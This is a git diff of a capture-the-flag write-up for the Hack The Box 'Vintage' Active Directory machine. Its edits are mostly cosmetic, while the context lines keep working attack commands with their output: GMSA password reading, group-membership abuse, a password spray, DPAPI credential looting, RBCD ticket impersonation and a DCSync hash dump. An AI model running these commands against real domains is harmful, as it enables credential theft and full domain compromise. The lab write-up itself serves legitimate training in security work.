@@ -79,6 +79,8 @@ Host script results:
 
 We are starting with theses creds ```P.Rosa;Rosaisbest123```
 
+## User
+
 ```bash
 nxc smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123'
 SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
@@ -182,7 +184,7 @@ nxc smb dc01.vintage.htb -u 'P.Rosa' -p 'Rosaisbest123'  -k --rid-brute
 SMB         dc01.vintage.htb 445    dc01             1107: VINTAGE\gMSA01$ (SidTypeUser)
 SMB         dc01.vintage.htb 445    dc01             1108: VINTAGE\FS01$ (SidTypeUser)
 ```
-## Abusing Pre-Windows 2000 Compatibility
+### Abusing Pre-Windows 2000 Compatibility
 
 Using **AD-Miner** for a different view on potential attack paths
 
@@ -190,7 +192,7 @@ Using **AD-Miner** for a different view on potential attack paths
 AD-miner -u 'neo4j' -p 'exegol4thewin' -cf vintage
 ```
 
-![alt text](../assets/image_vintage/2024-12-01_07-59_adminer_pre2000.png)
+![alt text](image_vintage/2024-12-01_07-59_adminer_pre2000.png)
 
 Using **pre2k** like this :
 
@@ -204,11 +206,11 @@ pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile users.txt
 ```
 We can retrieve the ccache of **FS01$** 
 
-## Read Group Managed Service Accounts (GMSA) Password
+### Read Group Managed Service Accounts (GMSA) Password
 
 Now if we check on bloodhound we can see this 
 
-![alt text](../assets/image_vintage/2024-12-01_07-21_bloodhound_fs01.png)
+![alt text](image_vintage/2024-12-01_07-21_bloodhound_fs01.png)
 
 But first, what is **GMSA**
 
@@ -230,7 +232,7 @@ msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHW
 ```
 Looking again on **bloodhound**
 
-![alt text](../assets/image_vintage/2024-12-01_07-48_bloodhound_gmsa01.png)
+![alt text](image_vintage/2024-12-01_07-48_bloodhound_gmsa01.png)
 
 Now we can use **BloodyAD** again to add for example our initial user **P.Rosa**
 
@@ -246,19 +248,19 @@ nxc ldap dc01.vintage.htb --use-kcache
 LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
 LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\gMSA01$ from ccache
 ```
-## GenericWrite Abuse
+### GenericWrite Abuse
 
 ```bash
 bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d vintage.htb -k add groupMember 'servicemanagers' 'p.rosa'
 [+] p.rosa added to servicemanagers
 ```
-![alt text](../assets/image_vintage/2024-12-01_08-15_bloodhound_servicemanagers.png)
+![alt text](image_vintage/2024-12-01_08-15_bloodhound_servicemanagers.png)
 
 Now we have **GenericAll permissions** on three different **service accounts**
 
-## ASREPRoasting
+### ASREPRoasting
 
-Knowing that these are **service accounts**, let's do some enumerations with **BloodyAD** again
+Knowing that these are service accounts, let's do some enumerations with **BloodyAD** again
 
 ```bash
 bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object 'svc_ark' --attr userAccountControl
@@ -278,7 +280,7 @@ bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object 'svc_sql' --attr u
 distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
 userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
 ```
-As we can see here, no **DONT_REQ_PREAUTH** flag there, which means **Pre Authentication** is enabled and 
+As we can see here, no DONT_REQ_PREAUTH flag there, which means Pre Authentication is enabled and 
 
 > ASREPRoasting is an Active Directory attack technique where an attacker abuses user accounts that do not require pre-authentication in Kerberos authentication.
 In Kerberos, normally a user must prove their identity (with their password or a hash) before the Key Distribution Center (KDC) will issue a Ticket Granting Ticket (TGT).
@@ -326,7 +328,7 @@ $krb5asrep$23$svc_sql@VINTAGE.HTB:f31b6253aeea38a8cbc9f85abab4009f$7fd332...0976
 
 After a lot of enumeration and nothing, let's try to spray the password 
 
-## Finally, PSRemote
+### Finnaly, PSRemote
 
 ```bash
 nxc smb dc01.vintage.htb -u users.txt -p 'REDACTED' -k --continue-on-success
@@ -352,7 +354,9 @@ Info: Establishing connection to remote endpoint
 ```
 <img src="../assets/gif/rick.gif" alt="yay" width="550">
 
-## DPAPI 
+## Root
+
+### DPAPI 
 
 After a lotttttt of enumerations, i searched through DPAPI (Data Protection API)
 
@@ -412,7 +416,7 @@ Mode                 LastWriteTime         Length Name
   <p style="margin: 0 0 1em; font-weight: bold; color: #ff4c4c; font-size: 1.1em;">
     ⚠️ Warning
   </p>
-  <p style="margin: 0 0 1em;">I tried to download it with WinRM but it was not working.</p>
+  <p style="margin: 0 0 1em;">I tried to download it with DPAPI but it was not working.</p>
 
   <pre style="
     background-color: #2b2b2e;
@@ -492,17 +496,13 @@ nxc smb dc01.vintage.htb -u c.neri_adm -p 'REDACTED' -k
 SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
 SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:REDACTED
 ```
-## 2 ways to RBCD
+### 2 ways to RBCD
 
 If we look again on bloodhound, we can see this 
 
-![alt text](../assets/image_vintage/c_nerigroup.png)
+![alt text](image_vintage/c_nerigroup.png)
 
-![alt text](../assets/image_vintage/2024-12-01_17-42_bloodhound_delegated_admins.png)
-
-> The AllowedToAct attribute is given when the group is configured for resource based constrained delegation (RBCD)
-
-[Check this](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
+![alt text](image_vintage/2024-12-01_17-42_bloodhound_delegated_admins.png)
 
 Looks like a free win here
 
@@ -515,7 +515,9 @@ Let's start
 
 <img src="../assets/gif/pepe-wink-pepe.gif" alt="yay" width="550">
 
-### RBCD with an Computer Account
+#### RBCD with an Computer Account
+
+> The AllowedToAct attribute is given when the group is configured for resource based constrained delegation (RBCD)
 
 I just have to add **FS01$** (because this computer already have an SPN) in **Delegates Admins** and impersonate **DC01$**
 
@@ -540,14 +542,6 @@ pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile users.txt
 export KRB5CCNAME=FS01\$.ccache
 
 getST.py -spn cifs/dc01.vintage.htb -impersonate 'DC01$' -k -no-pass vintage.htb/'fs01$'
-
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[*] Using TGT from cache
-[*] Impersonating DC01$
-[*] 	Requesting S4U2self
-[*] 	Requesting S4U2Proxy
-[*] Saving ticket in DC01$.ccache
 ```
 And **DCSYNC**
 
@@ -563,7 +557,7 @@ SMB         dc01.vintage.htb 445    dc01             Administrator:500:aad3b435b
 ```
 Ok it's cool but there is still another ways to **RBCD** 
 
-### Add an SPN to RBCD
+#### Add an SPN to RBCD
 
 ```bash
 getTGT.py -dc-ip "vintage.htb" "vintage.htb"/"c.neri_adm":"REDACTED"
